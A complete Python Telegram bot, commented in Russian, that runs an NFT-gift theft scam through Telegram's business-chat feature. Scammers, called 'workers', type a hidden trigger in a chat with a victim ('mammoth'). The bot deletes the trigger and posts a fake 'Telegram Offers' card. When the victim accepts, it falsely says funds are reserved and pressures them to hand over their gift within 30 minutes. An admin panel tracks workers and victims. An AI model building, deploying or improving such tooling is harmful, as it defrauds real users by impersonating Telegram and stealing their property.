import sys
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', line_buffering=True)
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', line_buffering=True)

import asyncio
import os
import re
import json
import random
import string
from datetime import datetime, timedelta
from pathlib import Path

from dotenv import load_dotenv
load_dotenv()

from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BotCommand
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import DeleteBusinessMessages

# ═══════════════════════════════════════════════════════
#   КОНФИГ — ИЗ ENV
# ═══════════════════════════════════════════════════════

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8986358602"))
BOT_USERNAME = os.getenv("BOT_USERNAME", "toutupbot")

if not BOT_TOKEN:
    print("FATAL: BOT_TOKEN env variable not set!", flush=True)
    sys.exit(1)

DATA_FILE = Path(os.getenv("DATA_FILE", "/data/data.json"))

# ═══ НАСТРОЙКИ ═══
DEFAULT_LANG = "ru"
DEFAULT_CURRENCY = "gram"
OFFER_TTL_HOURS = 6

LANGS = {
    "ru": "🇷🇺 Русский",
    "uk": "🇺🇦 Українська",
    "en": "🇬🇧 English",
    "ar": "🇸🇦 العربية",
}

CURRENCIES = {
    "gram": "GRAM",
    "stars": "⭐",
}

CURRENCY_LABELS = {
    "gram": "💎 GRAM",
    "stars": "⭐ Звёзды",
}

# ═══ ДАННЫЕ ═══
WORKERS = {ADMIN_ID}
WORKER_LANGS = {}
WORKER_CURRENCIES = {}
OFFERS = {}
_offer_counter = 0
BIZ_CONNS = {}


# ═══════════════════════════════════════════════════════
#   СОХРАНЕНИЕ / ЗАГРУЗКА
# ═══════════════════════════════════════════════════════

def save_data():
    try:
        DATA_FILE.parent.mkdir(parents=True, exist_ok=True)
        data = {
            "workers": sorted(WORKERS),
            "worker_langs": WORKER_LANGS,
            "worker_currencies": WORKER_CURRENCIES,
            "offer_counter": _offer_counter,
            "offers": {
                str(k): {
                    **v,
                    "created_at": v["created_at"].isoformat() if isinstance(v.get("created_at"), datetime) else v.get("created_at"),
                    "accepted_at": v["accepted_at"].isoformat() if isinstance(v.get("accepted_at"), datetime) else v.get("accepted_at"),
                }
                for k, v in OFFERS.items()
            },
        }
        tmp = DATA_FILE.with_suffix(".tmp")
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        os.replace(tmp, DATA_FILE)
    except Exception as e:
        print(f"[SAVE] error: {e}", flush=True)


def load_data():
    global _offer_counter, WORKERS, WORKER_LANGS, WORKER_CURRENCIES, OFFERS
    if not DATA_FILE.exists():
        print(f"[LOAD] no data file at {DATA_FILE}, starting fresh", flush=True)
        return
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)

        ws = data.get("workers", [])
        if isinstance(ws, list):
            WORKERS = set(int(x) for x in ws if str(x).lstrip("-").isdigit())
            WORKERS.add(ADMIN_ID)

        wl = data.get("worker_langs", {})
        if isinstance(wl, dict):
            WORKER_LANGS = {int(k): str(v) for k, v in wl.items() if str(k).lstrip("-").isdigit()}

        wc = data.get("worker_currencies", {})
        if isinstance(wc, dict):
            WORKER_CURRENCIES = {int(k): str(v) for k, v in wc.items() if str(k).lstrip("-").isdigit()}

        _offer_counter = int(data.get("offer_counter", 0))

        raw_offers = data.get("offers", {})
        OFFERS = {}
        if isinstance(raw_offers, dict):
            for k, v in raw_offers.items():
                if not str(k).isdigit() or not isinstance(v, dict):
                    continue
                oid = int(k)
                for df in ("created_at", "accepted_at"):
                    if v.get(df) and isinstance(v[df], str):
                        try:
                            v[df] = datetime.fromisoformat(v[df])
                        except Exception:
                            v[df] = None
                OFFERS[oid] = v

        print(f"[LOAD] workers={len(WORKERS)} langs={len(WORKER_LANGS)} currencies={len(WORKER_CURRENCIES)} offers={len(OFFERS)} counter={_offer_counter}", flush=True)
    except Exception as e:
        print(f"[LOAD] error: {e}", flush=True)


def next_offer_id() -> int:
    global _offer_counter
    _offer_counter += 1
    return _offer_counter


def gen_order_code() -> str:
    alphabet = string.ascii_uppercase + string.digits
    return "TG-" + "".join(random.choices(alphabet, k=10))


# ═══════════════════════════════════════════════════════
#   АВТООЧИСТКА
# ═══════════════════════════════════════════════════════

async def cleanup_expired_offers():
    while True:
        await asyncio.sleep(1800)
        try:
            now = datetime.utcnow()
            to_remove = []
            for oid, o in list(OFFERS.items()):
                created = o.get("created_at")
                if isinstance(created, datetime):
                    if now - created > timedelta(hours=OFFER_TTL_HOURS):
                        to_remove.append(oid)
            if to_remove:
                for oid in to_remove:
                    OFFERS.pop(oid, None)
                save_data()
                print(f"[CLEANUP] removed {len(to_remove)} expired offers", flush=True)
        except Exception as e:
            print(f"[CLEANUP] error: {e}", flush=True)


# ═══════════════════════════════════════════════════════
#   STARTUP
# ═══════════════════════════════════════════════════════

load_data()

print("=" * 60, flush=True)
print("BOT v23 — currency in profile", flush=True)
print(f"ADMIN: {ADMIN_ID}", flush=True)
print(f"DATA_FILE: {DATA_FILE}", flush=True)
print("=" * 60, flush=True)

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()


# ═══════════════════════════════════════════════════════
#   ХЕЛПЕРЫ
# ═══════════════════════════════════════════════════════

def is_worker(uid: int) -> bool:
    return uid in WORKERS


def get_lang(uid: int) -> str:
    return WORKER_LANGS.get(uid, DEFAULT_LANG)


def get_currency(uid: int) -> str:
    return WORKER_CURRENCIES.get(uid, DEFAULT_CURRENCY)


def currency_label(currency: str) -> str:
    return CURRENCIES.get(currency, "GRAM")


def parse_dot_offer(text: str):
    m = re.search(r'(?:https?://)?(t\.me/nft/[\w\-]+)', text)
    if not m:
        return None
    gift_path = m.group(1)
    gift_link = "https://" + gift_path
    gift_name = gift_path.split("/")[-1].replace("-", " #")
    without_link = text.replace(gift_path, "").replace("https://", "").replace("http://", "")
    without_dot = without_link.lstrip(".").strip()
    parts = without_dot.split()
    if not parts:
        return None
    try:
        price = int(parts[0])
    except ValueError:
        return None
    return gift_name, gift_link, price


def make_offer_card(o: dict) -> str:
    cur = currency_label(o.get("currency", DEFAULT_CURRENCY))
    return (
        f"⚖️ <b>Telegram Offers</b>\n\n"
        f"👤 Пользователь предлагает вам\n"
        f"<b>{o['price']} {cur}</b> за подарок <b>{o['gift_name']}</b>.\n\n"
        f"Оффер действителен ещё <b>{OFFER_TTL_HOURS} ч.</b>"
    )


def make_offer_kb(offer_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Принять", callback_data=f"accept:{offer_id}")],
        [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{offer_id}")],
    ])


async def notify_admin(text: str):
    try:
        await bot.send_message(ADMIN_ID, text)
    except Exception as e:
        print(f"[ADMIN] send failed: {e}", flush=True)


# ═══════════════════════════════════════════════════════
#   BUSINESS CONNECTION
# ═══════════════════════════════════════════════════════

@dp.business_connection()
async def on_business_connection(conn: types.BusinessConnection):
    try:
        BIZ_CONNS[conn.user.id] = conn.id
        print(f"[CONN] user={conn.user.id} conn={conn.id}", flush=True)
        try:
            await bot.send_message(
                conn.user.id,
                f"🔌 <b>Бизнес-бот подключён</b>\n\n"
                f"ID: <code>{conn.user.id}</code>\n\n"
                f"Создать оффер: <code>.t.me/nft/XXX 500</code> в чате с мамонтом"
            )
        except Exception:
            pass
    except Exception as e:
        print(f"[CONN] error: {e}", flush=True)


# ═══════════════════════════════════════════════════════
#   CALLBACKS
# ═══════════════════════════════════════════════════════

@dp.callback_query()
async def universal_callback(call: types.CallbackQuery):
    print(f"[CB] data={call.data} from={call.from_user.id} chat={call.message.chat.id}", flush=True)

    data = call.data or ""

    # ── setlang ──
    if data.startswith("setlang:"):
        if not is_worker(call.from_user.id):
            try:
                await call.answer("Не воркер", show_alert=True)
            except Exception:
                pass
            return
        new_lang = data.split(":")[1]
        if new_lang not in LANGS:
            try:
                await call.answer("❌ Неверный язык", show_alert=True)
            except Exception:
                pass
            return
        WORKER_LANGS[call.from_user.id] = new_lang
        save_data()
        try:
            await call.answer(f"✅ Язык: {LANGS[new_lang]}")
        except Exception:
            pass
        rows = []
        for code, name in LANGS.items():
            mark = "✅ " if code == new_lang else ""
            rows.append([InlineKeyboardButton(text=f"{mark}{name}", callback_data=f"setlang:{code}")])
        try:
            await call.message.edit_text("🌐 <b>Выбери язык:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
        except Exception:
            pass
        return

    # ── setcurrency ──
    if data.startswith("setcurrency:"):
        if not is_worker(call.from_user.id):
            try:
                await call.answer("Не воркер", show_alert=True)
            except Exception:
                pass
            return
        new_cur = data.split(":")[1]
        if new_cur not in CURRENCIES:
            try:
                await call.answer("❌ Неверная валюта", show_alert=True)
            except Exception:
                pass
            return
        WORKER_CURRENCIES[call.from_user.id] = new_cur
        save_data()
        label = CURRENCY_LABELS[new_cur]
        try:
            await call.answer(f"✅ Валюта: {label}")
        except Exception:
            pass
        rows = []
        for code, name in CURRENCY_LABELS.items():
            mark = "✅ " if code == new_cur else ""
            rows.append([InlineKeyboardButton(text=f"{mark}{name}", callback_data=f"setcurrency:{code}")])
        try:
            await call.message.edit_text("💱 <b>Выбери валюту офферов:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
        except Exception:
            pass
        return

    # ── accept / reject ──
    if ":" not in data:
        try:
            await call.answer()
        except Exception:
            pass
        return

    action, _, raw_id = data.partition(":")
    if action not in ("accept", "reject"):
        try:
            await call.answer()
        except Exception:
            pass
        return

    try:
        offer_id = int(raw_id)
    except ValueError:
        try:
            await call.answer("Оффер не найден", show_alert=True)
        except Exception:
            pass
        return

    o = OFFERS.get(offer_id)
    if not o:
        try:
            await call.answer("Оффер не найден или истёк", show_alert=True)
        except Exception:
            pass
        return

    created = o.get("created_at")
    if isinstance(created, datetime) and datetime.utcnow() - created > timedelta(hours=OFFER_TTL_HOURS):
        OFFERS.pop(offer_id, None)
        save_data()
        try:
            await call.answer("Оффер истёк", show_alert=True)
        except Exception:
            pass
        return

    mammoth_id = o["mammoth_id"]
    worker_id = o["worker_id"]
    worker_uname = (o.get("worker_username") or "").lstrip("@")
    status = o.get("status", "pending")
    cur_label = currency_label(o.get("currency", DEFAULT_CURRENCY))

    # ═══ ПРИНЯТЬ ═══
    if action == "accept":
        if worker_uname:
            recipient_str = f"@{worker_uname}"
        else:
            recipient_str = f"ID {worker_id}"

        alert_text = (
            f"Ваш подарок {o['gift_name']} зарезервирован.\n\n"
            f"Передайте подарок {recipient_str} в течение 30 минут."
        )

        if status == "accepted":
            try:
                await call.answer(alert_text, show_alert=True)
            except Exception:
                pass
            return

        try:
            await call.answer(alert_text, show_alert=True)
        except Exception:
            pass

        o["status"] = "accepted"
        o["accepted_at"] = datetime.utcnow()
        order = gen_order_code()
        o["order_code"] = order
        save_data()

        if worker_uname:
            recipient_line = f"👤 Получатель: <b>@{worker_uname}</b>"
            recipient_hint = f"выберите получателя: <b>@{worker_uname}</b>"
        else:
            recipient_line = f"👤 Получатель: <code>{worker_id}</code>"
            recipient_hint = f"выберите получателя по ID: <code>{worker_id}</code>"

        text = (
            f"✅ <b>Средства зарезервированы</b>\n\n"
            f"💰 Сумма: <b>{o['price']} {cur_label}</b>\n"
            f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
            f"📦 Заказ: <code>#{order}</code>\n"
            f"{recipient_line}\n\n"
            f"Для завершения сделки передайте подарок получателю.\n"
            f"Передача: откройте подарок в профиле → «Передать» → {recipient_hint}.\n\n"
            f"⚠️ <i>Передача должна быть завершена в течение 30 минут.</i>\n\n"
            f"После получения подарка средства автоматически зачислятся "
            f"на ваш баланс Telegram."
        )
        try:
            await bot.send_message(
                chat_id=mammoth_id,
                text=text,
                business_connection_id=o["biz_conn_id"],
            )
        except TelegramBadRequest as e:
            print(f"[ACCEPT] send failed: {e}", flush=True)

        worker_display = f"@{worker_uname}" if worker_uname else "—"
        await notify_admin(
            f"✅ <b>Оффер #{offer_id} принят</b>\n\n"
            f"👤 Мамонт: <code>{mammoth_id}</code>\n"
            f"💼 Воркер-получатель:\n"
            f"   • ID: <code>{worker_id}</code>\n"
            f"   • Username: <b>{worker_display}</b>\n"
            f"💰 Сумма: <b>{o['price']} {cur_label}</b>\n"
            f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
            f"🔗 Ссылка: {o['gift_link']}\n"
            f"📦 Заказ: <code>#{order}</code>"
        )

    # ═══ ОТКЛОНИТЬ ═══
    elif action == "reject":
        if status == "accepted":
            try:
                await call.answer("Оффер уже принят", show_alert=True)
            except Exception:
                pass
            return

        try:
            await call.answer("Оффер отклонён", show_alert=True)
        except Exception:
            pass

        try:
            await bot.send_message(
                chat_id=mammoth_id,
                text="❌ <b>Оффер отклонён</b>",
                business_connection_id=o["biz_conn_id"],
            )
        except TelegramBadRequest as e:
            print(f"[REJECT] send failed: {e}", flush=True)

        worker_display = f"@{worker_uname}" if worker_uname else "—"
        await notify_admin(
            f"❌ <b>Оффер #{offer_id} отклонён</b>\n\n"
            f"👤 Мамонт: <code>{mammoth_id}</code>\n"
            f"💼 Воркер:\n"
            f"   • ID: <code>{worker_id}</code>\n"
            f"   • Username: <b>{worker_display}</b>\n"
            f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
            f"🔗 Ссылка: {o['gift_link']}"
        )

        OFFERS.pop(offer_id, None)
        save_data()


# ═══════════════════════════════════════════════════════
#   ТОЧКА — СОЗДАНИЕ ОФФЕРА
# ═══════════════════════════════════════════════════════

@dp.business_message(F.text.startswith("."))
async def business_dot_offer(message: types.Message):
    uid = message.from_user.id
    if not is_worker(uid):
        return

    chat_id = message.chat.id
    text = (message.text or "").strip()

    parsed = parse_dot_offer(text)
    if not parsed:
        return

    gift_name, gift_link, price = parsed

    biz_conn_id = getattr(message, "business_connection_id", None) or BIZ_CONNS.get(uid)
    if not biz_conn_id:
        await bot.send_message(uid, "❌ Нет бизнес-подключения")
        return

    try:
        await bot(DeleteBusinessMessages(
            business_connection_id=biz_conn_id,
            message_ids=[message.message_id],
        ))
        print(f"[DOT] deleted msg_id={message.message_id}", flush=True)
    except Exception as e:
        print(f"[DOT] delete failed: {type(e).__name__}: {e}", flush=True)

    worker_currency = get_currency(uid)

    offer_id = next_offer_id()
    OFFERS[offer_id] = {
        "worker_id": uid,
        "worker_username": message.from_user.username or "",
        "mammoth_id": chat_id,
        "gift_name": gift_name,
        "gift_link": gift_link,
        "price": price,
        "created_at": datetime.utcnow(),
        "biz_conn_id": biz_conn_id,
        "lang": get_lang(uid),
        "currency": worker_currency,
        "status": "pending",
    }
    save_data()

    sent = False
    try:
        await bot.send_message(
            chat_id=chat_id,
            text=make_offer_card(OFFERS[offer_id]),
            reply_markup=make_offer_kb(offer_id),
            business_connection_id=biz_conn_id,
            disable_web_page_preview=False,
        )
        sent = True
    except TelegramBadRequest as e:
        await bot.send_message(uid, f"❌ Ошибка отправки: {e}")

    cur_label = currency_label(worker_currency)
    worker_uname_log = message.from_user.username or "—"
    await notify_admin(
        f"🆕 <b>Новый оффер #{offer_id}</b>\n\n"
        f"👤 Воркер:\n"
        f"   • ID: <code>{uid}</code>\n"
        f"   • Username: <b>@{worker_uname_log}</b>\n"
        f"🎯 Мамонт: <code>{chat_id}</code>\n"
        f"🎁 Подарок: <b>{gift_name}</b>\n"
        f"💰 Цена: <b>{price} {cur_label}</b>\n"
        f"🔗 Ссылка: {gift_link}\n"
        f"📤 Отправлено: {'✅' if sent else '❌'}"
    )


# ═══════════════════════════════════════════════════════
#   КОМАНДЫ
# ═══════════════════════════════════════════════════════

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    uid = message.from_user.id
    if not is_worker(uid):
        return
    lang = get_lang(uid)
    cur = get_currency(uid)
    await message.answer(
        f"👋 <b>Offers Bot</b>\n\n"
        f"👤 ID: <code>{uid}</code>\n"
        f"🌐 Язык: <b>{LANGS.get(lang, lang)}</b>\n"
        f"💱 Валюта: <b>{CURRENCY_LABELS.get(cur, cur)}</b>\n\n"
        f"<b>Команды:</b>\n"
        f"/lang — сменить язык\n"
        f"/currency — сменить валюту\n"
        f"/workers — список воркеров (админ)\n"
        f"/grant ID — добавить воркера (админ)\n"
        f"/revoke ID — убрать воркера (админ)\n"
        f"/offers — активные офферы (админ)\n\n"
        f"<b>Создать оффер:</b> напиши в бизнес-чате с мамонтом:\n"
        f"<code>.t.me/nft/XXX 500</code>",
    )


@dp.message(Command("lang"))
async def cmd_lang(message: types.Message):
    if not is_worker(message.from_user.id):
        return
    rows = []
    current = get_lang(message.from_user.id)
    for code, name in LANGS.items():
        mark = "✅ " if code == current else ""
        rows.append([InlineKeyboardButton(text=f"{mark}{name}", callback_data=f"setlang:{code}")])
    await message.answer("🌐 <b>Выбери язык:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))


@dp.message(Command("currency"))
async def cmd_currency(message: types.Message):
    if not is_worker(message.from_user.id):
        return
    rows = []
    current = get_currency(message.from_user.id)
    for code, name in CURRENCY_LABELS.items():
        mark = "✅ " if code == current else ""
        rows.append([InlineKeyboardButton(text=f"{mark}{name}", callback_data=f"setcurrency:{code}")])
    await message.answer("💱 <b>Выбери валюту офферов:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))


@dp.message(Command("workers"))
async def cmd_workers(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    lines = ["👥 <b>Воркеры:</b>\n"]
    for wid in sorted(WORKERS):
        lang = get_lang(wid)
        cur = get_currency(wid)
        lines.append(f"• <code>{wid}</code> — {LANGS.get(lang, lang)} — {CURRENCY_LABELS.get(cur, cur)}")
    await message.answer("\n".join(lines))


@dp.message(Command("grant"))
async def cmd_grant(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = (message.text or "").split()
    if len(args) < 2 or not args[1].lstrip("-").isdigit():
        await message.answer("Использование: <code>/grant user_id</code>")
        return
    uid = int(args[1])
    WORKERS.add(uid)
    save_data()
    await message.answer(f"✅ <code>{uid}</code> добавлен в воркеры")
    try:
        await bot.send_message(uid, "🎉 Тебе выдан доступ воркера. /start")
    except Exception:
        pass


@dp.message(Command("revoke"))
async def cmd_revoke(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = (message.text or "").split()
    if len(args) < 2 or not args[1].lstrip("-").isdigit():
        await message.answer("Использование: <code>/revoke user_id</code>")
        return
    uid = int(args[1])
    WORKERS.discard(uid)
    WORKER_LANGS.pop(uid, None)
    WORKER_CURRENCIES.pop(uid, None)
    save_data()
    await message.answer(f"✅ <code>{uid}</code> убран из воркеров")


@dp.message(Command("offers"))
async def cmd_offers(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    if not OFFERS:
        await message.answer("📋 Активных офферов нет")
        return
    lines = [f"📋 <b>Активные офферы ({len(OFFERS)}):</b>\n"]
    for oid, o in OFFERS.items():
        created = o.get("created_at")
        if isinstance(created, datetime):
            age = datetime.utcnow() - created
            minutes = int(age.total_seconds() // 60)
        else:
            minutes = "?"
        wuname = (o.get("worker_username") or "").lstrip("@")
        worker_display = f"@{wuname}" if wuname else "—"
        st = o.get("status", "pending")
        cur_label = currency_label(o.get("currency", DEFAULT_CURRENCY))
        lines.append(
            f"#{oid} [{st}] — {o['gift_name']} — <b>{o['price']} {cur_label}</b>\n"
            f"   Воркер: <code>{o['worker_id']}</code> ({worker_display})\n"
            f"   Мамонт: <code>{o['mammoth_id']}</code>\n"
            f"   Возраст: {minutes} мин."
        )
    await message.answer("\n".join(lines))


# ═══════════════════════════════════════════════════════
#   STARTUP
# ═══════════════════════════════════════════════════════

async def main():
    print("=" * 60, flush=True)
    print("BOOT v23", flush=True)
    print("=" * 60, flush=True)
    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except Exception as e:
        print(f"webhook clear fail: {e}", flush=True)
    try:
        await bot.set_my_commands([
            BotCommand(command="start", description="Меню"),
            BotCommand(command="lang", description="Сменить язык"),
            BotCommand(command="currency", description="Сменить валюту"),
            BotCommand(command="workers", description="Воркеры (админ)"),
            BotCommand(command="grant", description="Добавить воркера (админ)"),
            BotCommand(command="revoke", description="Убрать воркера (админ)"),
            BotCommand(command="offers", description="Активные офферы (админ)"),
        ])
    except Exception:
        pass

    asyncio.create_task(cleanup_expired_offers())

    print("Polling...", flush=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
